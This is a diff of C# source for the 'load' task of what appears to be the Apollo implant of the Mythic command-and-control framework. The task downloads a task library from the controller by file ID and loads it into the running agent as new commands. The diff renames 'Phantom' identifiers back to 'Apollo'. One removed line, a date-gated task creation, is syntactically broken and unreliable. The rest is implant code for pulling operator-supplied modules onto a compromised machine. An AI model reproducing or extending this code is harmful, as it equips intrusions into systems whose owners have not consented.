@@ -6,11 +6,11 @@
 
 #if LOAD
 
-using PhantomInterop.Classes;
-using PhantomInterop.Interfaces;
-using PhantomInterop.Structs.MythicStructs;
+using ApolloInterop.Classes;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Structs.MythicStructs;
 using System.Runtime.Serialization;
-using PhantomInterop.Structs.PhantomStructs;
+using ApolloInterop.Structs.ApolloStructs;
 using ST = System.Threading.Tasks;
 namespace Tasks
 {
@@ -31,13 +31,13 @@ namespace Tasks
 
         public override ST.Task CreateTasking()
         {
-            if(DateTime.Now.Year > 2020) { return new ST.Task(() => { Start(); } else { return null; } }, _stopToken.Token);
+            return new ST.Task(() => { Start(); }, _cancellationToken.Token);
         }
 
         public override void Start()
         {
             MythicTaskResponse resp;
-            LoadParameters parameters = _dataSerializer.Deserialize<LoadParameters>(_data.Parameters);
+            LoadParameters parameters = _jsonSerializer.Deserialize<LoadParameters>(_data.Parameters);
             if (parameters.Commands.Length == 0)
             {
                 resp = CreateTaskResponse("No commands given to load.", true, "error");
@@ -48,11 +48,11 @@ namespace Tasks
             }
             else
             {
-                if (_agent.GetFileManager().GetFile(_stopToken.Token,_data.ID, parameters.FileId,out byte[] taskLib))
+                if (_agent.GetFileManager().GetFile(_cancellationToken.Token,_data.ID, parameters.FileId,out byte[] taskLib))
                 {
                     if (_agent.GetTaskManager().LoadTaskModule(taskLib, parameters.Commands))
                     {
-                        ICommandMessage[] items = new ICommandMessage[parameters.Commands.Length];
+                        IMythicMessage[] items = new IMythicMessage[parameters.Commands.Length];
                         for (int i = 0; i < items.Length; i++)
                         {
                             items[i] = new CommandInformation
